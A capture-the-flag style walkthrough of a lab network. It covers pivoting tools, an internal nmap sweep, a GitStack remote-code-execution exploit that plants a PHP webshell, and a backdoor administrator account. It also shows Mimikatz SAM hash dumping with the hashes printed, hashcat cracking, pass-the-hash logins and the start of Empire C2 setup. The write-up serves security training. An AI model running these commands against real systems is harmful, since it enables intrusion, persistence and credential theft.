The goal of Task9 is to use the public web server we successfully penetrated and gained SSH access to as a foothold to find active hosts on the internal network.
※The reason we explore from SSH is that it is relatively more stable than the previously obtained shell (exploring from a reverse shell or pseudoshell is also fine).

We will use the arp -a command to check the list of IPs the target server has recently communicated with, and then use a ping sweep to find active hosts and select the next target for pivoting.

**Command:**
```bash
arp -a
# Check the list of IPs the target server has recently communicated with
# Can get hints about internal network hosts

for i in {1..255}; do (ping -c 1 10.200.180.${i} | grep "bytes from" &); done
# Ping sweep from 10.200.180.1 ~ 255
# Only output active hosts that respond
```
**Result:**
```bash
[root@prod-serv ~]# arp -a
ip-10-200-180-1.ec2.internal (10.200.180.1) at 12:43:61:bf:df:3d [ether] on eth0

[root@prod-serv ~]# for i in {1..255}; do (ping -c 1 10.200.180.${i} | grep "bytes from" &); done
64 bytes from 10.200.180.1: icmp_seq=1 ttl=255 time=0.446 ms
64 bytes from 10.200.180.200: icmp_seq=1 ttl=64 time=0.068 ms
64 bytes from 10.200.180.250: icmp_seq=1 ttl=64 time=7.61 ms
```
As a result of running the arp -a command, we did not obtain any special information beyond the gateway (10.200.180.1).
After running the ping sweep, we confirmed a response from 10.200.180.250 and will pivot to that host to enter the internal network.

**Answer:**
```bash
What is the absolute path to the file containing DNS entries on Linux?
#/etc/resolv.conf

What is the absolute path to the hosts file on Windows?
#C:\Windows\System32\drivers\etc\hosts

How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?
#for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
```
### \[ Task10 - Proxychains&Foxyproxy (Pivoting) \]
Proxychains and FoxyProxy are tools that forward traffic to the internal network through a tunnel created by pivoting.
Proxychains is used in CLI environments, and FoxyProxy is used when accessing internal network web apps from a browser.
Since this Task explains how to use Proxychains and FoxyProxy, we will briefly skip it.

**Answer:**
```bash
What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?
#socks4 127.0.0.1 4242

What command would you use to telnet through a proxy to 172.16.0.100:23?
#proxychains telnet 172.16.0.100 23

You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?
#FP (FoxyProxy)
```
### \[ Task11 - SSH Tunnelling / Port Forwarding (Pivoting) \]
SSH tunneling is a technique that uses an SSH connection to create a virtual pathway into an internal network.
A forward connection is a method of creating a tunnel from the attacking machine to the target, while a reverse connection is a method where the target server directly connects to the attacking machine.
This allows access to internal networks that cannot be directly accessed from outside.

**Answer:**
```bash
If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?
#L

Which switch combination can be used to background an SSH port forward or tunnel?
#-fN

It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?
#Nay

What command would you use to create a pair of throwaway SSH keys for a reverse connection?
#ssh-keygen

If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")
#ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN

What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?
#ssh -D 8000 user@target.thm -fN

If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
#ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN
```
### \[ Task12 - plink.exe (Pivoting) \]
Plink.exe is the command-line version of the PuTTY client for Windows, and is a tool used for SSH tunneling on Windows servers.
It is mainly used to generate a reverse connection by transferring the binary when the Windows server does not have an SSH server.

**Answer:**
```bash
What tool can be used to convert OpenSSH keys into PuTTY style keys?
#puttygen
```
### \[ Task13 - Socat (Pivoting) \]
Socat is a tool that connects two connections and is used for port forwarding and reverse shell relaying.
Unlike SSH tunneling, it is not installed by default on the target and must be uploaded as a static binary.

**Answer:**
```bash
Which socat option allows you to reuse the same listening port for more than one connection?
#reuseaddr

If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory? #
#./socat tcp-l:8000 tcp:172.16.0.200:443

What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
#./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &
```
### \[ Task14 - Chisel (Pivoting) \]
Chisel is a tool that can set up tunneling and port forwarding even without SSH access.
It operates in two modes, client and server, and is used by uploading binaries to both the attacking machine and the target machine.

**Answer:**
```bash
What command would you use to start a chisel server for a reverse connection on your attacking machine?
#./chisel server -p 4242 --reverse

What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
#./chisel client 172.16.0.200:4242 R:socks &

How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.
#./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &

If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
#./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
```
### \[ Task15 - sshuttle (Pivoting) \]
sshuttle is a tool that uses SSH connections to automatically route internal network traffic like a VPN.
It allows direct access to internal network devices without proxychains and can only be used on Linux targets.

**Answer:**
```bash
How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16
#sshuttle -r pwned@172.16.20.7 172.16.0.0/16

What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?
#--ssh-cmd "ssh  -i priv_key"

What switch (and argument) could you use to fix this error?
#-x 172.16.0.100
```
### \[ Task16 - Conclusion (pivoting) \]
**Summary of pivoting tools by purpose:**
```bash
Proxychains / FoxyProxy
# Tools that utilize tunnels created by other tools
# Intercepts and forwards traffic to the tunnel entrance
# Proxychains → CLI tools (nmap, etc.)
# FoxyProxy → Web app access from browser

SSH Tunneling
# Creates tunnel using SSH connection
# -L → Local port forwarding (single specific port)
# -D → Create proxy tunnel (multiple ports)
# -R → Reverse port forwarding
# Requires SSH server on target to use

plink.exe
# SSH client for Windows
# Used for SSH tunneling on Windows targets
# Upload binary to target then execute

Socat
# Tool that connects two connections
# Used for port forwarding and reverse shell relaying
# Works on both Windows/Linux
# Not installed by default on target, requires binary upload

Chisel
# Tunneling/port forwarding possible without SSH
# Useful when SSH access is not available
# Works on both Windows/Linux
# Requires binaries on both attacking machine and target machine

sshuttle
# Operates like a VPN using SSH connection
# Can directly access internal network without proxychains
# Can only be used on Linux targets
# Requires Python installed on target
```
### \[ Task17 - Enumeration (Git Server) \]
The goal of Task17 is to scan the internal network using a static nmap binary on the web server and find the next attack target.
Since the web server is directly connected to the internal network, running nmap inside the web server SSH shell without tunneling allows scanning of the internal network.
However, since nmap is not installed on the web server, we will upload a static nmap binary from the attacking machine to the web server and use it.
Also, since internet access may not be available on the target server, we need to create a web server on the local shell (attacker) and upload from there.
※The reason for uploading via web server is that the file needs to be in a state where it can be served.

**Command (Local Shell):**
```bash
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap -O nmap-jaejun835
#Download static nmap binary
#wget     → File download command

sudo python3 -m http.server 80
# -m http.server → Run python3 built-in web server
```
**Result:**
```bash

┌──(root㉿jaejun835)-[~]
└─# wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap -O nmap-jaejun835

--2026-03-21 12:21:47--  https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap [following]
--2026-03-21 12:21:53--  https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8001::154, 2606:50c0:8002::154, 2606:50c0:8003::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8001::154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5944464 (5.7M) [application/octet-stream]
Saving to: 'nmap-jaejun835'

nmap-jaejun835           100%[===============================>]   5.67M  35.8MB/s    in 0.2s

2026-03-21 12:21:59 (35.8 MB/s) - 'nmap-jaejun835' saved [5944464/5944464]


┌──(root㉿jaejun835)-[~]
└─# sudo python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.200.180.200 - - [21/Mar/2026 12:24:28] "GET /nmap-jaejun835 HTTP/1.1" 200 -
```
**Command (Target Shell):**
```bash
curl 10.250.180.9/nmap-jaejun835 -o /tmp/nmap-jaejun835 && chmod +x /tmp/nmap-jaejun835
#Download nmap from attacking machine web server and grant execution permission
# -o       → Specify save path and file name
# chmod +x → Grant execution permission

/tmp/nmap-jaejun835 -sn 10.200.180.1-255 -oN /tmp/scan-jaejun835
#Scan internal network hosts
# -sn → Check hosts only without port scan

/tmp/nmap-jaejun835 -p 1-15000 --min-rate 3000 10.200.180.X
#Port scan discovered hosts
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ ssh -i id_rsa.txt root@10.200.180.200
[root@prod-serv ~]# curl 10.250.180.9/nmap-jaejun835 -o /tmp/nmap-jaejun835 && chmod +x /tmp/nmap-jaejun835
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0  1186k      0  0:00:04  0:00:04 --:--:-- 1237k
[root@prod-serv ~]# /tmp/nmap-jaejun835 -sn 10.200.180.1-255 -oN /tmp/scan-jaejun835

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-03-21 04:24 GMT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-180-1.ec2.internal (10.200.180.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.11s latency).
MAC Address: 12:43:61:BF:DF:3D (Unknown)
Nmap scan report for ip-10-200-180-100.ec2.internal (10.200.180.100)
Host is up (0.00066s latency).
MAC Address: 12:FD:36:D0:60:7F (Unknown)
Nmap scan report for ip-10-200-180-150.ec2.internal (10.200.180.150)
Host is up (-0.11s latency).
MAC Address: 12:DD:78:6B:F1:05 (Unknown)
Nmap scan report for ip-10-200-180-250.ec2.internal (10.200.180.250)
Host is up (0.00058s latency).
MAC Address: 12:11:54:93:F2:D5 (Unknown)
Nmap scan report for ip-10-200-180-200.ec2.internal (10.200.180.200)
Host is up.
Nmap done: 255 IP addresses (5 hosts up) scanned in 3.99 seconds
[root@prod-serv ~]# /tmp/nmap-jaejun835 -p 1-15000 --min-rate 3000 10.200.180.100

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-03-21 04:33 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-180-100.ec2.internal (10.200.180.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.20s latency).
All 15000 scanned ports on ip-10-200-180-100.ec2.internal (10.200.180.100) are filtered
MAC Address: 12:FD:36:D0:60:7F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 10.40 seconds
[root@prod-serv ~]# /tmp/nmap-jaejun835 -p 1-15000 --min-rate 3000 10.200.180.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-03-21 04:33 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-180-150.ec2.internal (10.200.180.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.023s latency).
Not shown: 14996 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman
MAC Address: 12:DD:78:6B:F1:05 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 15.47 seconds
```
As a result of scanning the internal network using the nmap binary, we discovered two active hosts: 10.200.180.100 and 10.200.180.150.
Host 100 had all ports in a filtered state and was inaccessible.
On host 150, we confirmed that ports 80, 3389, 5357, and 5985 are open, and identified it as a Windows machine through port 3389 (RDP).
Since the HTTP service running on port 80 is likely to have vulnerabilities, we selected this host as the next attack target.

**Answer:**
```bash
Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?
#2

In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)
#100,150

Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?
#150

Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?
#80,3389,5985

Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
#HTTP
```
### \[ Task18 - Pivoting (Git Server) \]
The goal of Task18 is to pivot to the 80 port web service of the internal host (10.200.180.150) using sshuttle and search for vulnerabilities.

**Command:**
```bash
sshuttle -r root@10.200.180.200 --ssh-cmd "ssh -i id_rsa.txt" 10.200.180.0/24 -x 10.200.180.200
# -r        → Specify relay server
# --ssh-cmd → Specify SSH key file
# -x        → Exclude web server (Broken Pipe prevention)
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ sshuttle -r root@10.200.180.200 --ssh-cmd "ssh -i id_rsa.txt" 10.200.180.0/24 -x 10.200.180.200

[local sudo] Password:
c : Connected to server.
```
By running the sshuttle command, we created a tunnel through the web server (10.200.180.200).
This allows browser access to the internal host (10.200.180.150) that could not be directly accessed from outside.
Next, let's access the web service on host 150 to check what service is running.

**Address:**
```
<http://10.200.180.150>
```
**Result:**

(image)

As a result of accessing http://10.200.180.150 in the browser, a Django 404 error page was displayed and DEBUG mode was enabled, exposing the internal URL structure.
Having confirmed that the GitStack service is running, let's access http://10.200.180.150/gitstack to check the GitStack login page.

**Address:**
```
 <http://10.200.180.150/gitstack>
```
**Result:**

(image)

As a result of accessing http://10.200.180.150/gitstack, we confirmed the GitStack login page.
Default credentials (admin/admin) were exposed on the page, so we attempted to log in but failed.
Next, let's search for GitStack vulnerabilities using searchsploit.

**Command:**
```bash
searchsploit gitstack
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ searchsploit gitstack
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                               | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Metaspl | windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                        | php/webapps/43777.py
--------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
As a result of searching for GitStack vulnerabilities with searchsploit, we found 3 exploits.
Among them, we will use the Python RCE exploit (EDB-43777) for GitStack version 2.3.10.

**Answer:**
```bash
What is the name of the program running the service?
#Gitstack

Do these default credentials work (Aye/Nay)?
#Nay

There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?
#43777
```
### \[ Task19 - Code Review (Git Server) \]
The goal of Task19 is to analyze the EDB-43777 exploit code and configure it to be executable.

**Command:**
```bash
searchsploit -m 43777
# -m → Copy exploit to current directory
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ searchsploit -m 43777

  Exploit: GitStack 2.3.10 - Remote Code Execution
      URL: <https://www.exploit-db.com/exploits/43777>
     Path: /usr/share/exploitdb/exploits/php/webapps/43777.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
cp: overwrite '/home/jaejun835/43777.py'?
Copied to: /home/jaejun835/43777.py
```
We copied the exploit to the current directory using the searchsploit -m 43777 command.
Next, we ran dos2unix to convert DOS line endings (CRLF) to Linux line endings (LF) to make the exploit executable.
※ dos2unix is used to convert Windows-style line endings (CRLF) to Linux-style line endings (LF) to prevent errors when running scripts on Linux.

**Command:**
```bash
dos2unix ./43777.py
# Convert DOS line endings (CRLF) to Linux line endings (LF)
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ dos2unix ./43777.py

dos2unix: converting file ./43777.py to Unix format...
```
Finally, open the exploit code with nano to add the shebang, configure the IP, and rename exploit.php.

**Command:**
```bash
nano 43777.py
# Open exploit code
# 1. Add shebang (#!/usr/bin/python2)
# 2. Set IP (10.200.180.150)
# 3. Change exploit.php → exploit-jaejun835.php

sed -i 's/exploit.php/exploit-<user>.php/g' 43777.py
# Batch change exploit.php → exploit-<user>.php
```
**Answer:**
```bash
Look at the information at the top of the script. On what date was this exploit written?
#18.01.2018

Bearing this in mind, is the script written in Python2 or Python3?
#Python2

Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?
#csrftoken
```
### \[ Task20 - Exploiation (Git Server) \]
The goal of this Task is to run the exploit configured in the previous Task to obtain a webshell, collect basic information, and prepare to obtain a reverse shell through a ping test.

**Command:**
```bash
python2 43777.py
# Run exploit
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ python2 43777.py

[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work.
[+] Execute command
"nt authority\\system
"
```
As a result of running python2 43777.py, the webshell upload was successful and we confirmed that command execution is possible with NT AUTHORITY\\SYSTEM privileges.
※This means the system has been completely taken over with the highest privileges in Windows.
Next, let's collect basic information.

**Command:**
```bash
curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=whoami"
# Check running user

curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=hostname"
# Check host name

curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=systeminfo"
# Check OS information
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=whoami"

"nt authority\\system
"

┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=hostname"

"git-serv
"

┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=systeminfo"

"
Host Name:                 GIT-SERV
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-70000-00000-AA159
Original Install Date:     08/11/2020, 13:19:49
System Boot Time:          25/03/2026, 06:57:02
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 24/08/2006
Windows Directory:         C:\\Windows
System Directory:          C:\\Windows\\system32
Boot Device:               \\Device\\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,310 MB
Virtual Memory: Max Size:  2,432 MB
Virtual Memory: Available: 1,838 MB
Virtual Memory: In Use:    594 MB
Page File Location(s):     C:\\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB4580422
                           [02]: KB4512577
                           [03]: KB4580325
                           [04]: KB4587735
                           [05]: KB4592440
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.200.180.1
                                 IP address(es)
                                 [01]: 10.200.180.150
                                 [02]: fe80::3d67:930a:520d:faf2
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
"
```
As a result of collecting basic information using the webshell, the host name is git-serv, the operating system is Windows Server 2019 Standard, and we confirmed it is running with NT AUTHORITY\\SYSTEM privileges.
Next, let's conduct a ping test to check if the target server can directly connect to the attacking machine.

**Command:**
```bash
tcpdump -i tun0 icmp
# Wait for ICMP packets on the tun0 interface

curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=ping -n 3 10.250.180.9"
# Send ping 3 times to attacking machine
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ tcpdump -i tun0 icmp

tcpdump: tun0: You don't have permission to perform this capture on that device
(socket: Operation not permitted)

┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=ping -n 3 10.250.180.9"

"
Pinging 10.250.180.9 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 10.250.180.9:
    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
"
```
As a result of the ping test, all 3 packets timed out, confirming that the target server cannot directly connect to the attacking machine.
Therefore, we will set up a socat relay on the web server (10.200.180.200) to receive the reverse shell.

**Answer:**
```bash
What is the hostname for this target?
#git-serv

What operating system is this target?
#Windows

What user is the server running as?
#NT AUTHORITY\\SYSTEM

How many make it to the waiting listener?
#0
```
### \[ Task21 - Stabilisation & Post Exploitation (Git Server) \]
The goal of Task21 is to create an account on the GitStack server, establish stable access via WinRM and RDP, and then dump password hashes with Mimikatz.

**Command:**
```bash
curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=net user jaejun835 PASSWORD123! /add"
# Create new account

curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=net localgroup Administrators jaejun835 /add"
# Add to Administrators group

curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=net localgroup \"Remote Management Users\" jaejun835 /add"
# Add to Remote Management Users group
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=net user jaejun835 PASSWORD123! /add"

"The command completed successfully.

"

┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=net localgroup Administrators jaejun835 /add"

"The command completed successfully.

"

┌──(jaejun835㉿jaejun835)-[~]
└─$ curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> -d "a=net localgroup \"Remote Management Users\" jaejun835 /add"

"The command completed successfully.

"
```
Using the webshell, we created the jaejun835 account and added it to the Administrators and Remote Management Users groups.
Next, let's connect via evil-winrm to verify that a stable shell is working.

**Command:**
```bash
evil-winrm -u jaejun835 -p PASSWORD123! -i 10.200.180.150
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ evil-winrm -u jaejun835 -p PASSWORD123! -i 10.200.180.150

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\jaejun835\\Documents>
```
As a result of connecting via evil-winrm, we obtained a stable shell.
Next, let's connect to the GUI environment via RDP, run Mimikatz, and dump password hashes.
Mimikatz is a tool that extracts password hashes from the Windows SAM database, allowing us to obtain the hashes for the Administrator and Thomas accounts.

**Command:**
```bash
xfreerdp /v:10.200.180.150 /u:jaejun835 /p:PASSWORD123! +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
# RDP connection + Mimikatz sharing

\\\\tsclient\\share\\mimikatz\\x64\\mimikatz.exe
# Run Mimikatz

privilege::debug
# Obtain debug privileges

token::elevate
# Escalate to SYSTEM privileges

lsadump::sam
# Dump password hashes
```
**Result:**

(image)
```bash
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\\Windows\\system32> \\\\tsclient\\share\\mimikatz\\x64\\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \\ / ##       > <https://blog.gentilkiwi.com/mimikatz>
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > <https://pingcastle.com> / <https://mysmartlogon.com> ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\\SYSTEM

664     {0;000003e7} 1 D 19949          NT AUTHORITY\\SYSTEM     S-1-5-18        (04g,21p)       Primary
-> Impersonated !
* Process Token : {0;000cba3d} 2 F 1929628     GIT-SERV\\jaejun835      S-1-5-21-3335744492-1614955177-2693036043-1003  (15g,24p)       Primary
* Thread Token  : {0;000003e7} 1 D 1977101     NT AUTHORITY\\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043

SAMKey : f4a3c96f8149df966517ec3554632cf4

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c70854ba88fb4a9c56111facebdf3c36

RID  : 000003e9 (1001)
User : Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f

RID  : 000003ea (1002)
User : Jumbeer
  Hash NTLM: 0ee7970edf2c0c5e62fbf1f65b8d029e

RID  : 000003eb (1003)
User : jaejun835
  Hash NTLM: 56ba5df7d467d769b14805fcbab28d51

mimikatz #
```
After connecting via RDP, we ran Mimikatz from the shared drive.
We obtained debug privileges with privilege::debug, escalated to SYSTEM privileges with token::elevate, and then dumped password hashes from the SAM database using the lsadump::sam command.
As a result, we obtained the NTLM hash of Administrator and the NTLM hash of Thomas.
Next, let's crack Thomas's hash using hashcat.

**Command:**
```bash
hashcat -m 1000 02d90eda8f6b6b06c32d5f207831101f /usr/share/wordlists/rockyou.txt
```
**Result:**
```bash
hashcat -m 1000 02d90eda8f6b6b06c32d5f207831101f /usr/share/wordlists/rockyou.txt
# -m 1000 → NTLM hash mode
# rockyou.txt → Wordlist
```
As a result of cracking Thomas's NTLM hash with Hashcat, we confirmed that the password is i\<3ruby.
Next, let's use the obtained Administrator NTLM hash to connect to the Administrator account via a Pass-the-Hash attack.

**Command:**
```bash
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150
# -H → Connect using hash instead of password
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>
```
We successfully connected to the Administrator account via Pass-the-Hash attack using the NTLM hash.
This established complete access to the GitStack server (10.200.180.150).

**Answer:**
```bash
What is the Administrator password hash?
#37db630168e5f82aafa8461e05c6bbd1

What is the NTLM password hash for the user "Thomas"?
#02d90eda8f6b6b06c32d5f207831101f

What is Thomas' password?
#i<3ruby
```
### \[ Task22~29 - Introduction (Command and Control) \]
In Tasks 22~29, we studied the concepts and components of the Empire C2 framework.
A C2 (Command and Control) framework is a tool for remotely controlling and managing penetrated targets.
Until now, we issued commands to targets via webshells or reverse shells, but these are unstable and functionally limited.
However, using Empire allows managing targets in a more stable and powerful way.

The operation of Empire is as follows.
First, the attacker runs a Listener to wait for the target's connection.
Then, a payload called a Stager is generated and executed on the target.
When the Stager is executed, the target attempts to connect to the Listener, and when the connection succeeds, an Agent is created.
Once the Agent is created, the attacker can perform various additional attacks such as hash dumping and privilege escalation using Modules.
In other words, it operates in the order of Listener → Stager → Agent → Module, with each stage organically connected.

However, since the Git server (10.200.180.150) cannot directly connect externally, we use the http_hop listener method that uses the web server (10.200.180.200) as an intermediate relay to receive agents.

Starting from Task 30, we will actually install Empire and proceed with the above process to receive an agent from the Git server and carry out additional attacks.

### \[ Task30~32 - Empire (Command and Control) \]
The goal of Tasks 30~32 is to install the Empire C2 framework, configure listeners and stagers, and obtain agents from prod-serv and the Git server.

**Command:**
```bash
sudo powershell-empire server
# Run Empire server
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ sudo powershell-empire server
[INFO]: Submodules auto update enabled. Loading.
[INFO]: No .git directory found. Skipping submodule fetch.
[INFO]: Checking submodules...
[INFO]: No .git directory found. Skipping submodule check.
[INFO]: Using mysql database.
[INFO]: Empire starting up...
[INFO]: Empire Compiler: directory not found. Cloning Empire Compiler
